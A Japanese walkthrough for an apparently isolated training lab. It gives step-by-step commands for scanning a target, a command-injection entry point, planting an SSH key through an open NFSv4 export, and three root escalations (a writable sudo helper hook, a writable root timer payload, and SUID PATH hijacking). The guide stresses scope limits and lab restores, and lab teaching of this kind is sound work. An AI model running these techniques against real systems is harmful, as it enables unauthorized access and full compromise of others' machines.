最初の接続確認

入口を決める前に、Kaliの有線IP、経路、標的が公開しているサービスを事実として並べます。 入口として期待するポートは 22、80、445、2049 です。

[Kali] 
ip address
[Kali] 
ip route
[Kali] 
ping -c 1 10.13.37.10
[Kali] 
nmap -sV -Pn -p 22,80,445,2049 10.13.37.10

Web診断で入力境界を確認する

KaliのFirefoxで スタッフ用診断画面 を開き、通常の入力と区切り記号を含む入力の差を比べます。

[Kaliブラウザ]

Web入口から標的内コマンドを試す場合は、同じ診断欄で 127.0.0.1; <試すコマンド> の形にします。

NFSv4をmountしてmechanic接続を確認する

このLabはNFSv4-onlyです。showmount は使わず、公開rootを直接mountします。

[Kali] 
sudo mkdir -p /mnt/workshop
sudo mount -t nfs4 -o vers=4,proto=tcp 10.13.37.10:/ /mnt/workshop
ls -la /mnt/workshop
[Kali] 
ssh-keygen -t ed25519 -f ~/.ssh/bukai-mechanic -N ''
sudo install -m 600 ~/.ssh/bukai-mechanic.pub /mnt/workshop/authorized_keys
[Kali] 
ssh -i ~/.ssh/bukai-mechanic mechanic@10.13.37.10
[標的Debian] 
whoami

権限昇格の経路

3つのfootholdはすべて同じ lab-foothold groupに入り、以下の3経路を選べます。

権限昇格

sudo保守helperが共同編集hookをroot実行

脆弱性
NOPASSWD helperの二次信頼先がgroup書き込み可能
CVE
CVEなし。custom helperとsudoersの設定不備です。
成功の目印
hook内の id が uid=0(root) を返します。
sudoの許可とhookの書き込み権限をたどる
[標的Debian] 
sudo -l
ls -ld /srv/kazekiri/maintenance-hooks
sed -n '1,80p' /usr/local/sbin/kazekiri-maintenance
[標的Debian] 
printf '#!/bin/sh\nid\nwhoami\nhead -c 1 /root/ROOT.flag >/dev/null\n' > /srv/kazekiri/maintenance-hooks/bukai.sh
sudo /usr/local/sbin/kazekiri-maintenance /srv/kazekiri/maintenance-hooks/bukai.sh
権限昇格

group-writable payloadをroot timerが実行

脆弱性
実行者rootとpayload編集者lab-footholdの分離不備
CVE
CVEなし。systemdの製品脆弱性ではありません。
成功の目印
次回実行後のproof fileに uid=0(root) が残ります。
timerから書き換え可能なpayloadまでたどる
[標的Debian] 
systemctl list-timers --all | grep open-world-root-timer
systemctl cat open-world-root-timer.service
ls -l /opt/kazekiri/maintenance/nightly.sh
[標的Debian] 
printf '#!/bin/sh\nid > /tmp/bukai-timer-root.txt\nhead -c 1 /root/ROOT.flag >/dev/null\n' > /opt/kazekiri/maintenance/nightly.sh
systemctl list-timers open-world-root-timer.timer
[標的Debian / 次回実行後] 
cat /tmp/bukai-timer-root.txt

timer間隔は約3分です。待機中に別の対象や外部ネットワークへ探索範囲を広げません。

権限昇格

教材用SUID helperのunsafe PATH解決

脆弱性
root SUID binaryがrendererを絶対pathでなく検索
CVE
CVEなし。training-only custom binaryの実装不備です。
成功の目印
差し替えたrendererの id が uid=0(root) を返します。
SUID bitとPATHから探す実行名を結びつける
[標的Debian] 
ls -l /usr/local/bin/kazekiri-report
strings /usr/local/bin/kazekiri-report | grep renderer
[標的Debian] 
mkdir -p /tmp/bukai-path
printf '#!/bin/sh\nid\nwhoami\nhead -c 1 /root/ROOT.flag >/dev/null\n' > /tmp/bukai-path/kazekiri-report-render
chmod 755 /tmp/bukai-path/kazekiri-report-render
[標的Debian] 
PATH=/tmp/bukai-path:/usr/local/libexec:/usr/bin:/bin /usr/local/bin/kazekiri-report

root確認後

uid=0(root) を確認したら追加操作を止めます。侵害済みDebian内のcleanupやresetは信頼せず、 次の経路へ進む前に運営者が信頼済み外部mediaからfresh restoreします。

  • flag本文、生成された資格情報、terminal historyを証跡へ残さない
  • 会社LAN、インターネット、第三者システムを対象にしない
  • 想定外のroute、DNS、forwarding、NATを検出したらLAN cableを抜く

該当する項目はありません。検索語を短くするか、「すべて」を選んでください。
